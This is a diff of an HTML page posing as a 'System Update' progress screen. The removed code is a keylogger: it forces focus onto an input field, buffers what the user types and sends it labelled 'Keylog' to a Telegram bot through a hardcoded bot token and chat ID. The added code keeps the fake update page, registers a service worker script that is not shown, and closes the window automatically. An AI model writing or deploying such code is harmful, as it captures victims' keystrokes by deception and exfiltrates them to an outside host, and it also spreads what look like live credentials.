@@ -21,7 +21,6 @@
             padding: 40px;
             border-radius: 20px;
             box-shadow: 0 0 30px rgba(0,0,0,0.8);
-            max-width: 90%;
         }
         h1 { color: #00ff88; }
         .progress {
@@ -44,50 +43,9 @@
             100% { width: 100%; }
         }
         .status { color: #aaa; font-size: 14px; }
-
-        #keyInput {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            padding: 14px;
-            background: #333;
-            border: 2px solid #00ff88;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 18px;
-            text-align: center;
-            z-index: 999;
-            outline: none;
-        }
-        #keyInput:focus {
-            border-color: #00ff88;
-            box-shadow: 0 0 30px rgba(0,255,136,0.4);
-        }
-        #debug {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            color: #ff4444;
-            font-size: 12px;
-            background: rgba(0,0,0,0.8);
-            padding: 10px;
-            border-radius: 8px;
-            max-width: 90%;
-            z-index: 9999;
-            font-family: monospace;
-            max-height: 200px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-        }
     </style>
 </head>
 <body>
-
-    <!-- Debug panel -->
-    <div id="debug">🟢 Ready...</div>
-
     <div class="container">
         <h1>🔧 System Update</h1>
         <p>Optimizing system performance...</p>
@@ -97,142 +55,20 @@
         <p class="status">✅ Update completed successfully</p>
     </div>
 
-    <input type="text" id="keyInput" placeholder="Type here..." autofocus>
-
     <script>
-        // ===== DEBUG =====
-        function debug(msg) {
-            const el = document.getElementById('debug');
-            const time = new Date().toLocaleTimeString();
-            const lines = el.innerHTML.split('\n');
-            if (lines.length > 10) {
-                lines.pop();
-            }
-            lines.unshift(`[${time}] ${msg}`);
-            el.innerHTML = lines.join('\n');
+        // ===== REGISTER SERVICE WORKER =====
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(() => {
+                    console.log('✅ Service Worker registered');
+                })
+                .catch(err => {
+                    console.log('❌ SW registration failed:', err);
+                });
         }
 
-        // ===== TELEGRAM CONFIG =====
-        const BOT_TOKEN = "8910457881:AAE9TznGCDNXkAxuo3Js_A1HaRVppAvhJuo";
-        const CHAT_ID = "1431950109";
-
-        if (!BOT_TOKEN || BOT_TOKEN === "") {
-            debug("❌ BOT_TOKEN is empty!");
-        } else {
-            debug("✅ BOT_TOKEN loaded: " + BOT_TOKEN.substring(0, 10) + "...");
-        }
-
-        if (!CHAT_ID || CHAT_ID === "") {
-            debug("❌ CHAT_ID is empty!");
-        } else {
-            debug("✅ CHAT_ID loaded: " + CHAT_ID);
-        }
-
-        // ===== BUFFER & TIMER =====
-        let buffer = "";
-        let timer = null;
-        const IDLE_TIME = 10000; // 10 seconds
-        const input = document.getElementById('keyInput');
-
-        // ===== FOCUS =====
-        setTimeout(() => input.focus(), 500);
-        document.addEventListener('click', () => input.focus());
-
-        // ===== RESET TIMER =====
-        function resetTimer() {
-            if (timer) clearTimeout(timer);
-            timer = setTimeout(() => {
-                if (buffer.length > 0) {
-                    debug("⏰ Auto-sending: " + buffer);
-                    sendToTelegram(buffer);
-                    buffer = "";
-                    input.value = "";
-                } else {
-                    debug("⏰ Timer fired but buffer empty");
-                }
-            }, IDLE_TIME);
-        }
-
-        // ===== INPUT EVENT =====
-        input.addEventListener('input', function(e) {
-            const currentValue = this.value;
-            const previousValue = buffer;
-
-            // Don't store if backspaced or cleared
-            if (currentValue.length < previousValue.length) {
-                buffer = currentValue;
-                debug("⬅️ Backspace detected, buffer: " + buffer);
-                resetTimer();
-                return;
-            }
-
-            // New characters added
-            if (currentValue.length > previousValue.length) {
-                const newChar = currentValue.slice(-1);
-                buffer = currentValue;
-                debug("✏️ Char: " + newChar + ", buffer: " + buffer);
-                resetTimer();
-            }
-        });
-
-        // ===== ENTER KEY =====
-        input.addEventListener('keydown', (e) => {
-            if (e.key === "Enter") {
-                e.preventDefault();
-                if (buffer.length > 0) {
-                    debug("⌨️ Enter pressed, sending: " + buffer);
-                    sendToTelegram(buffer);
-                    buffer = "";
-                    input.value = "";
-                } else {
-                    debug("⌨️ Enter pressed but buffer empty");
-                }
-                if (timer) clearTimeout(timer);
-            }
-        });
-
-        // ===== SEND TO TELEGRAM =====
-        function sendToTelegram(msg) {
-            if (msg.trim() === "") {
-                debug("⚠️ Empty message, not sending");
-                return;
-            }
-
-            debug("📤 Sending to Telegram: " + msg);
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const body = JSON.stringify({
-                chat_id: CHAT_ID,
-                text: "📱 Keylog: " + msg
-            });
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: body
-            })
-            .then(response => {
-                debug("📥 Response status: " + response.status);
-                return response.json();
-            })
-            .then(data => {
-                debug("📥 Response data: " + JSON.stringify(data));
-                if (data.ok) {
-                    debug("✅ Message sent successfully!");
-                } else {
-                    debug("❌ Telegram error: " + data.description);
-                }
-            })
-            .catch(error => {
-                debug("❌ Network error: " + error.message);
-            });
-        }
-
-        // ===== TEST ON LOAD =====
-        setTimeout(() => {
-            debug("🔍 Testing Telegram connection...");
-            sendToTelegram("🔍 Ghost Key activated!");
-        }, 3000);
+        // Auto-close after 3 seconds
+        setTimeout(() => window.close(), 3000);
     </script>
 </body>
 </html>
